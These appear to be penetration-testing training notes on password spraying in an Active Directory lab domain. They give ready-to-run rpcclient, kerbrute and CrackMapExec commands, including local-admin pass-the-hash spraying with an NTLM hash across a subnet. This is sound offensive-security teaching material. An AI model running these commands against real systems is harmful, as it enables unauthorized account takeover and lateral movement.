Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack.

## Internal Password Spraying from a Linux Host

 `Rpcclient` is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login. We can filter out invalid login attempts by `grepping` for `Authority` in the response. The following Bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) can be used to perform the attack.
#### Using a Bash one-liner for the Attack

	 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

'We can use kerbrute for the same attack '
#### Using Kerbrute for the Attack

	 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

#### Using CrackMapExec & Filtering Logon Failures

	 sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

After getting one (or more!) hits with our password spraying attack, we can then use `CrackMapExec` to validate the credentials quickly against a Domain Controller.

#### Validating the Credentials with CrackMapExec

	 sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

## Local Administrator Password Reuse

Local Admin spraying with crackmapexec 

	 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

